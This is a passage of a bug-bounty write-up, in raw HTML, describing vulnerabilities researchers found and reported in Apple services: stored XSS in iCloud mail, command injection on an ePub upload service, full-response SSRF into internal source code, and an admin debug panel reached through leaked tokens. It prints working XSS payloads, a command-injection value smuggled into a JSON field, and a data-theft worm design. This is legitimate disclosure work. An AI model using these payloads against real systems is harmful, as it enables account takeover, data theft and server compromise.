&lt;p&gt;After we sent this API call, we could now authenticate as a global administrator to the application. This gave us full oversight to the warehouse management software and probably RCE via some accepted functionality.&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;1024&quot; height=&quot;469&quot; class=&quot;wp-image-1361&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/memrz-1024x469.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/memrz-1024x469.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/memrz-300x137.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/memrz-768x352.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/memrz.png 1507w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;p&gt;There were hundreds of different functionalities that would've caused massive information disclosure and been capable of disrupting what appeared to be a somewhat crucial application used for inventory and warehouse management.&lt;/p&gt;
&lt;/div&gt;
&lt;div id=&quot;vuln3&quot; class=&quot;section&quot;&gt;
&lt;h2&gt;Wormable Stored Cross-Site Scripting Vulnerabilities Allow Attacker to Steal iCloud Data through a Modified Email&lt;/h2&gt;
&lt;p&gt;One of the core parts of Apple’s infrastructure is their iCloud platform. This website works as an automatic storage mechanism for photos, videos, documents, and app related data for Apple products. Additionally, this platform provides services like Mail and Find my iPhone.&lt;/p&gt;
&lt;p&gt;The mail service is a full email platform where users can send and receive emails similar to Gmail and Yahoo. Additionally, there is a mail app on both iOS and Mac which is installed by default on the products. The mail service is hosted on “www.icloud.com” alongside all of the other services like file and document storage.&lt;/p&gt;
&lt;p&gt;This meant, from an attackers perspective, that any cross-site scripting vulnerability would allow an attacker to retrieve whatever information they wanted to from the iCloud service. We began to look for any cross-site scripting issues at this point.&lt;/p&gt;
&lt;p&gt;The way the mail application works is very straightforward. When the service receives an email and a user opens it, the data is processed into a JSON blob which is sanitized and picked apart by JavaScript and then displayed to the user.&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;600&quot; height=&quot;419&quot; class=&quot;wp-image-1190&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/icloud-mail.jpg&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/icloud-mail.jpg 600w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/icloud-mail-300x210.jpg 300w&quot; sizes=&quot;(max-width: 600px) 100vw, 600px&quot;/&gt;&lt;p&gt;This means that there is no server side processing of the emails in terms of content sanitation, and that all of the actual functionality to render and process the mail body is within the JavaScript where it’s done client side. This isn’t necessarily a bad thing, but simplifies the process of identifying XSS by understanding what specifically we’ll need to break within the source code.&lt;/p&gt;
&lt;h3&gt;Stored XSS via Style Tag Confusion&lt;/h3&gt;
&lt;p&gt;When testing this functionality one of the things I eventually messed with was the “&amp;lt;style&amp;gt;” tag. This tag is interesting as the DOM will only cancel this element with an end “&amp;lt;/style&amp;gt;” tag. This means that if we wrote “&amp;lt;style&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;/style&amp;gt;” and it was fully rendered in the DOM, there would be no alert prompt as the content of the tag is strictly CSS and the script tag was stuffed within the tag and not beyond the closing tag.&lt;/p&gt;
&lt;p&gt;From a sanitization perspective, the only things Apple would need to worry about here would be an ending style tag, or if there was sensitive information on the page, CSS injection via import chaining.&lt;/p&gt;
&lt;p&gt;I decided to focus on trying to break out of the style tag without Apple realizing it since it would be a very straightforward stored XSS if achievable.&lt;/p&gt;
&lt;p&gt;I played around with this for a while trying various permutations and eventually observed something interesting: when you had two style tags within the email, the contents of the style tags would be concatenated together into one style tag. This meant that if we could get “&amp;lt;/sty” into the first tag and “le&amp;gt;” into the second tag, it would be possible to trick the application into thinking our tag was still open when it really wasn’t.&lt;/p&gt;
&lt;p&gt;I sent the following payload to test if it would work:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;&amp;lt;style&amp;gt;&amp;lt;/sty&amp;lt;/style&amp;gt;
&amp;lt;style&amp;gt;le&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;/style&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The email popped up in my inbox. I clicked it. There was an alert prompt! It had worked!&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img loading=&quot;lazy&quot; width=&quot;646&quot; height=&quot;340&quot; class=&quot;wp-image-1193&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/alert-1.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/alert-1.png 646w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/alert-1-300x158.png 300w&quot; sizes=&quot;(max-width: 646px) 100vw, 646px&quot;/&gt;&lt;/div&gt;
&lt;p&gt;The DOM of the page included the following:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;&amp;lt;style&amp;gt;&amp;lt;/style&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;/style&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Since the mail application is hosted on “www.icloud.com” this meant that we had browser permissions to retrieve the HTTP responses for the corresponding APIs for the iCloud service (if we could sneak in the JavaScript to reach out to them).&lt;/p&gt;
&lt;p&gt;An explanation of the above payload is as follows:&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img loading=&quot;lazy&quot; width=&quot;311&quot; height=&quot;231&quot; class=&quot;wp-image-1245&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram_explan.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram_explan.png 311w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram_explan-300x223.png 300w&quot; sizes=&quot;(max-width: 311px) 100vw, 311px&quot;/&gt;&lt;/div&gt;
&lt;p&gt;At this point we decided the coolest proof of concept would be something which steals all of the victim’s personal information (photos, calendar information, and documents) then forwards the same exploit to all of their contacts.&lt;/p&gt;

&lt;p&gt;We built a neat PoC which would return the photo URLs from the iCloud API, stick them into image tags, and then append a list of contacts for the user account underneath them. This demonstrated that it was possible to retrieve the values, but in order to exfiltrate them we would have to bypass a CSP which meant no easy outbound HTTP requests to anything but “.apple.com” and a few other domains.&lt;/p&gt;
&lt;p&gt;Luckily for us, the service is a mail client. We can simply use JavaScript to invoke an email to ourselves, attach the iCloud photo URLs and contacts, then fire away all of the victim’s signed iCloud photo and document URLs.&lt;/p&gt;
&lt;p&gt;The following video demonstrates a proof of concept whereas a victim’s photos are stolen. In a full exploitation scenario performed by a malicious party, an attacker could silently steal all of the victim’s photos, videos, and documents, then forward the modified email to the victim’s contact list and worm the cross-site scripting payload against the iCloud mail service.&lt;/p&gt;
&lt;p&gt;&lt;iframe title=&quot;Proof of Concept&quot; width=&quot;688&quot; height=&quot;387&quot; src=&quot;https://www.youtube.com/embed/jclY-s2kJ7E?feature=oembed&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/p&gt;
&lt;h3&gt;Stored XSS via Hyperlink Confusion&lt;/h3&gt;
&lt;p&gt;Later on I found a second cross-site scripting vulnerability affecting mail in a similar fashion.&lt;/p&gt;
&lt;p&gt;One thing I’ll always check with these sorts of semi-HTML applications is how they handle hyperlinks. It seems intuitive to automatically turn an unmarked URL into a hyperlink, but it can get messy if it isn’t being sanitized properly or is combined with other functionalities. This is a common place to look for XSS due to the reliance on regex, innerHTML, and all of the accepted elements you can add alongside the URL.&lt;/p&gt;
&lt;p&gt;The second piece of interesting functionality for this XSS is the total removal of certain tags like “&amp;lt;script&amp;gt;” and “&amp;lt;iframe&amp;gt;”. This one is neat because certain things will rely on characters like space, tabs, and new lines whereas the void left by the removed tag can provide those characters without telling the JavaScript parser. These indifferences allow for attackers to confuse the application and sneak in malicious characters which can invoke XSS.&lt;/p&gt;
&lt;p&gt;I played around with both of these functionalities for a while (automatic hyperlinking and the total removal of certain tags) until deciding to combine the two and attempt to see how they behaved together. To my surprise, the following string broke the hyperlinking functionality and confused the DOM:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;https://www.domain.com/abc#&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;https://domain.com/abc&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;After sending the above by itself within an email, the content was parsed to the following:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;&amp;lt;a href=&quot;https://www.domain.com/abc#&amp;lt;a href=&quot; https:=&quot;&quot; www.domain.com=&quot;&quot; abc=&quot;&amp;amp;quot;&quot; rel=&quot;noopener noreferrer&quot;&amp;gt;https://www.domain.com/abc&amp;lt;/a&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;This was very interesting to see initially, but exploiting it would be a bit harder. It is easy to define the attributes within the tag (e.g. src, onmouseover, onclick, etc.) but providing the values would be difficult as we still had to match the URL regex so it wouldn’t escape the automatic hyperlinking functionality. The payload that eventually worked without sending single quotes, double quotes, parenthesis, spaces, or backticks was the following:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;https://www.icloud.com/mail/#&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;https://www.icloud.com/onmouseover=location=/javascript:alert%28document.domain%29/.source;//&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The payload produced this in the DOM:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;&amp;lt;a href=&quot;https://www.icloud.com/mail#&amp;lt;a href=&quot; https:=&quot;&quot; www.icloud.com=&quot;&quot; onmouseover=&quot;location=/javascript:alert%28document.domain%29/.source;//&amp;amp;quot;&quot;&amp;gt;https://www.icloud.com/onmouseover=location=/javascript:alert%28document.domain%29/.source;//&amp;lt;/a&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;And gave us this beautiful alert prompt:&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img loading=&quot;lazy&quot; width=&quot;795&quot; height=&quot;430&quot; class=&quot;wp-image-1195&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/2nd_xss.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/2nd_xss.png 795w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/2nd_xss-300x162.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/2nd_xss-768x415.png 768w&quot; sizes=&quot;(max-width: 795px) 100vw, 795px&quot;/&gt;&lt;/div&gt;
&lt;p&gt;This payload was from a CTF solution by @Blaklis_. I had originally thought it might be an unexploitable XSS, but there seems to always be a solution somewhere for edge case XSS.&lt;/p&gt;
&lt;blockquote class=&quot;twitter-tweet&quot; data-width=&quot;550&quot; data-dnt=&quot;true&quot;&gt;
&lt;p lang=&quot;fr&quot; dir=&quot;ltr&quot;&gt;?age=19;location=/javascript:alert%25281%2529/.source; :&amp;gt;&lt;/p&gt;
— Blaklis (@Blaklis_) &lt;a href=&quot;https://twitter.com/Blaklis_/status/1125663871056928769?ref_src=twsrc%5Etfw&quot;&gt;May 7, 2019&lt;/a&gt;&lt;/blockquote&gt;
&lt;p&gt;My best explanation here is that (1) when loading the initial URL the characters within the “&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;” were acceptable within the automatic hyperlinking process and didn’t break it, then (2) the removal of the script tags created a space or some sort of void which reset the automatic hyperlinking functionality without closing the initial hyperlinking functionality, and lastly (3) the second hyperlink added the additional quote that was used to both break out of the href and create the onmouseover event handler.&lt;/p&gt;
&lt;p&gt;The impact for the second XSS was the same as the first one, except for this one the user would have to trigger the onmouseover event handler via putting their mouse somewhere within the email body, but this part could be simplified to trigger more easily by making the hyperlink of the entire email.&lt;/p&gt;
&lt;p&gt;Overall, an attacker could've abused this to...&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Create a worm that has the capability to silently exfiltrate/modify iCloud account information including photos and videos&lt;/li&gt;
&lt;li&gt;Silently execute arbitrary HTML and JavaScript within the victim's browser&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;div id=&quot;vuln4&quot; class=&quot;section&quot;&gt;
&lt;h2&gt;Command Injection in Author’s ePublisher&lt;/h2&gt;
&lt;p&gt;A major feature of Apple is the ability to upload and sell books, movies, tv shows, and songs. The files you upload get propagated to various Apple services such as iTunes where people can download or purchase them. This seemed like a good vector for customer XSS and blind XSS against employees.&lt;/p&gt;
&lt;p&gt;In order to upload files, we first had to apply for access to the service on iTunes Connect.&lt;/p&gt;
&lt;p&gt;We ran into an interesting problem where we did not have access to an iPad or iPhone, but we kept on looking for ways to use this service still. After some investigating, we discovered a tool called Transporter.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://help.apple.com/itc/transporteruserguide/#/&quot;&gt;Transporter&lt;/a&gt; is a Java app that can be used to interact with a jsonrpc API for bulk uploading files utilizing a few different file services.&lt;/p&gt;
&lt;p&gt;At the same time, we were also looking through the iTunes Connect Book &lt;a href=&quot;https://itunespartner.apple.com/books/&quot;&gt;help docs&lt;/a&gt; and we found a page that explained a few different ways to upload books including an online web service: &lt;a href=&quot;https://itunespartner.apple.com/books/articles/submit-your-ebook-2717&quot;&gt;https://itunespartner.apple.com/books/articles/submit-your-ebook-2717&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This led us to the following service, &lt;a href=&quot;https://authors.apple.com/epub-upload&quot;&gt;Apple Books for Authors&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This service only has a couple of features:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Sign-in / Register&lt;/li&gt;
&lt;li&gt;Upload images for book cover&lt;/li&gt;
&lt;li&gt;Upload book ePub file&lt;/li&gt;
&lt;li&gt;Upload book Sample ePub file&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The first thing we did was download sample epub files and upload them. Funny enough, the first epub file we grabbed was an epub version 1 format with invalid xhtml. The publish tool spit out a huge wall of text of errors to let us know why it failed to upload/validate.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HTTP Request:&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;POST /api/v1/validate/epub HTTP/1.1
Host: authors.apple.com
{&quot;epubKey&quot;:&quot;2020_8_11/10f7f9ad-2a8a-44aa-9eec-8e48468de1d8_sample.epub&quot;,&quot;providerId&quot;:&quot;BrettBuerhaus2096637541&quot;}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;HTTP Response:&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;[2020-08-11 21:49:59 UTC] &amp;lt;main&amp;gt; DBG-X:   parameter TransporterArguments = -m validateRawAssets -assetFile /tmp/10f7f9ad-2a8a-44aa-9eec-8e48468de1d8_sample.epub -dsToken **hidden value** -DDataCenters=contentdelivery.itunes.apple.com -Dtransporter.client=BooksPortal -Dcom.apple.transporter.updater.disable=true -verbose eXtreme -Dcom.transporter.client.version=1.0 -itc_provider BrettBuerhaus2096637541&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;As you can probably guess at this point, all we had to do was a simple command injection on the provderId JSON value.&lt;/p&gt;
&lt;p&gt;We intercepted the request on the next upload and replaced it with:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;&quot;providerId&quot;:&quot;BrettBuerhaus2096637541||test123&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;And we got the following output:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;/bin/sh: 1: test123: not found&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The following is a screenshot showing the output of &quot;&lt;em&gt;ls /&lt;/em&gt;&quot;:&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/wH1pZ_LNvOCVYGHNyd_UvbGFyaUx4s0mnb7_OmGTnQtP_jKIEmf5MhbY36UuJmnZACgnM2r1wE593bAFBqxcBgcV2sXhJrBAnDJxQc5lCZ4p7wDlvIBXjyvnC52qjZ7FstL_LQtK&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;Overall, an attacker could've abused this to...&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Execute arbitrary commands on the authors.apple.com webserver&lt;/li&gt;
&lt;li&gt;Access Apple's internal network&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;This was a good exercise in making sure you fully explore what you are testing. A lot of the big names in recon research talk about creating mind maps and this is an example of that. We started with iTunes Connect, started exploring Books, and continued to branch out until we fully understood what services exist around that single feature.&lt;/p&gt;
&lt;p&gt;It also is a good reminder that you need to find as much information as possible before you start going down rabbit-holes while testing. Without exploring the help docs, you may have missed the web epub app entirely as it is a single link on one page.&lt;/p&gt;
&lt;/div&gt;
&lt;div id=&quot;vuln5&quot; class=&quot;section&quot;&gt;
&lt;h2&gt;Full Response SSRF on iCloud allows Attacker to Retrieve Apple Source Code&lt;/h2&gt;
&lt;p&gt;The most elusive bug while hacking on Apple was full response SSRF. We found nearly a dozen blind or semi-blind SSRFs, but had a terribly hard time trying to find any way to retrieve the response. This was incredibly frustrating as during our recon process we found tons of references to what appeared to be awesome internal applications for source code management, user management, information lookup, and customer support.&lt;/p&gt;
&lt;p&gt;It wasn’t until the end of our engagement when we finally stumbled upon one which seemed to have a great deal of internal network access.&lt;/p&gt;
&lt;p&gt;During testing the iCloud application we noticed that you could open up certain attachments from the iCloud mail application in the iCloud pages application via the “Open in Pages” functionality. When you submitted the form to do this, it sent an HTTP request containing a URL parameter which included the URL of the mail file attachment in the request. If you attempted to modify this URL to something arbitrary, the request would fail and give a “400 Bad Request” error. The process would create a “job” where the response of the HTTP request was converted into an Apple Pages document, then opened in a new tab.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/92TplGEpg2vNgSTy0ZZNIKmwtmDvEw4DLo_bd3xY5iT5RE8r8FbDcVg00r91Ome5gXWhL1f5IWIgmia5Xm4VbjX9ZiKdDlgIGwwIAcnlZZ4-0K2ykz0BCU8joOzEWFpHC78lq0qO&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;It seemed to only allow URLs from the “p37-mailws.icloud.com” domain, would not convert pages with anything but a 200 OK HTTP response, and would additionally be a bit hard to test as the conversion process was done through multiple HTTP requests and a job queue.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/SGwI6VbjG20IasiEdf27EXd7BIOC8RZvXSyd-NY2xsnb4Qy4YgyzW2-Y3V4QkOHzBZ5LnhJDKKzrJKtWc3mFQtYEs1-pAyzwS-QaJoI9fIud4_d-8NjszLMUSlM3g7LdeGi_KR2-&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;What worked to exploit this was appending “@ourdomain.com” after the white-listed domain which would point the request at our domain. The process would convert the raw HTML to an Apple pages file then display it to us in a new window. This was a bit annoying to fuzz with, so Brett ended up throwing together a python script to automate the process.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://gist.github.com/samwcyo/f8387351ce9acb7cffce3f1dd94ce0d6&quot;&gt;https://gist.github.com/samwcyo/f8387351ce9acb7cffce3f1dd94ce0d6&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Our proof of concept for this report was demonstrating we could read and access Apple’s internal maven repository which contained the source code for what appeared to be hundreds of different applications, iOS, and macOS.&lt;/p&gt;
&lt;p&gt;If the file was too large to be saved to a Pages file, it would instead be stored to the drive in a downloadable zip file which would allow us to extract large files like jars and zips.&lt;/p&gt;
&lt;p&gt;We had found the internal maven URL disclosed in a Github repository.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/UbmQwbbPFT5_YhytObqs9s4gpbmwIdu_UQCCrfUS7LmdIcHsC2jRybKzCOo7Qt6RVKgJc8DJbIoZXV5KQAJSdBjkNO02890w1GjI4Dbv0a2B-If913ZrzeNVWu2Sy2VoEW0uSIZQ&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;There were many other internal applications we could’ve pulled from, but since we demonstrated access to the Maven repository with source code access we reported the issue right away.&lt;/p&gt;
&lt;p&gt;Overall, an attacker could've abused this to...&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Read the various iOS source code files within the maven repository&lt;/li&gt;
&lt;li&gt;Access anything else available within Apple's internal network&lt;/li&gt;
&lt;li&gt;Fully compromise a victim's session via a cross-site scripting vulnerability due to the disclosed HTTP only cookies within the HTTP request&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The full process that had to be followed when scripting this is as follows:&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;831&quot; height=&quot;1022&quot; class=&quot;wp-image-1247&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/process.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/process.png 831w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/process-244x300.png 244w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/process-768x945.png 768w&quot; sizes=&quot;(max-width: 831px) 100vw, 831px&quot;/&gt;&lt;/div&gt;
&lt;div id=&quot;vuln6&quot; class=&quot;section&quot;&gt;
&lt;h2&gt;Nova Admin Debug Panel Access via REST Error Leak&lt;/h2&gt;
&lt;p&gt;While going through a list of all Apple subdomains one at a time, we discovered some interesting functionality from &quot;concierge.apple.com&quot;, &quot;s.apple.com&quot;, and &quot;events.apple.com&quot;.&lt;/p&gt;
&lt;p&gt;With a little bit of Google dorking, we found that a specific request to &quot;s.apple.com&quot; would take you to &quot;events.apple.com&quot; with an authentication token.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HTTP Request:&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;GET /dQ{REDACTED}fE HTTP/1.1
Host: s.apple.com&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;HTTP Response:&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;HTTP/1.1 200
Server: Apple
Location: https://events.apple.com/content/events/retail_nso/ae/en/applecampathome.html?token=fh{REDACTED}VHUba&amp;amp;a=1&amp;amp;l=e&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Performing our standard recon techniques, we grabbed the JavaScript files and started looking for endpoints and API routes.&lt;/p&gt;
&lt;img src=&quot;https://lh3.googleusercontent.com/6Ppw1LgBGxhr6JRDHqiWgCC-6TBO4gCaO9c-8XV-Ulv14lBEOlqCMCvM1t5ieq-qM1EY1dhy5qTzJOIKRnxBfxAd0JOiDUqQobCV61HBSOY0bntK8rSuUpoNi72lwjFI_0wT2vi4&quot; alt=&quot;&quot;/&gt;&lt;p&gt;Discovering a /services/public/account endpoint, we started to play around with it. We quickly discovered that passing in an invalid marketCode parameter resulted in the server returning a REST exception error.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HTTP Request:&lt;/strong&gt;&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; class=&quot;alignnone size-full wp-image-1427&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/request_x-1.png&quot; alt=&quot;&quot; width=&quot;783&quot; height=&quot;159&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/request_x-1.png 783w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/request_x-1-300x61.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/request_x-1-768x156.png 768w&quot; sizes=&quot;(max-width: 783px) 100vw, 783px&quot;/&gt;&lt;p&gt;&lt;strong&gt;HTTP Response:&lt;/strong&gt;&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; class=&quot;alignnone size-full wp-image-1408&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/edit_me_now-1.png&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;392&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/edit_me_now-1.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/edit_me_now-1-300x115.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/edit_me_now-1-768x294.png 768w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;p&gt;From the error message we can see the server is forwarding an API request to the following location:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;https://nova-admin.corp.apple.com/services/locations/searchLocation?locationName=t&amp;amp;rtm=1&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;We can also see that it leaked some request/response headers including a nova-admin cookie and an authorization token that the server is sending to make requests to nova-admin.corp.apple.com API requests.&lt;/p&gt;
&lt;p&gt;Also interesting is that the /services/ endpoint is similar to the /services/public/ API endpoints for the events app. We could not hit the endpoints on the event app and we did not have access to nova-admin.corp.apple.com. Going back to our recon data, we noticed that there is a nova.apple.com.&lt;/p&gt;
&lt;p&gt;Attempting to use the acquired auth token and cookie, we noted that the credentials were valid as we were no longer being redirected to idsmac auth, but it was still 403 forbidden.&lt;/p&gt;
&lt;p&gt;With a little bit of fuzzing, we discovered that we were able to hit /services/debug.func.php.&lt;/p&gt;
&lt;p&gt;Even though it was not a website with PHP extensions, it appeared adding any extension to the debug route would bypass the route restrictions they built since the authorization was separate from the functionality itself.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HTTP Request:&lt;/strong&gt;&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;913&quot; height=&quot;200&quot; class=&quot;wp-image-1226&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/last_one.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/last_one.png 913w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/last_one-300x66.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/last_one-768x168.png 768w&quot; sizes=&quot;(max-width: 913px) 100vw, 913px&quot;/&gt;&lt;p&gt;&lt;strong&gt;HTTP Response:&lt;/strong&gt;&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; class=&quot;alignnone size-full wp-image-1428&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/new_two-1.png&quot; alt=&quot;&quot; width=&quot;635&quot; height=&quot;199&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/new_two-1.png 635w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/new_two-1-300x94.png 300w&quot; sizes=&quot;(max-width: 635px) 100vw, 635px&quot;/&gt;&lt;p&gt;This portal contained dozens of options, also contained several hundred configuration parameters and values.&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;884&quot; height=&quot;669&quot; class=&quot;wp-image-1224&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-1.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-1.png 884w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-1-300x227.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-1-768x581.png 768w&quot; sizes=&quot;(max-width: 884px) 100vw, 884px&quot;/&gt;&lt;p&gt;One of the values also contained an AWS secret key, another contained server crontabs. Having the ability to update these values was enough to prove command injection.&lt;/p&gt;
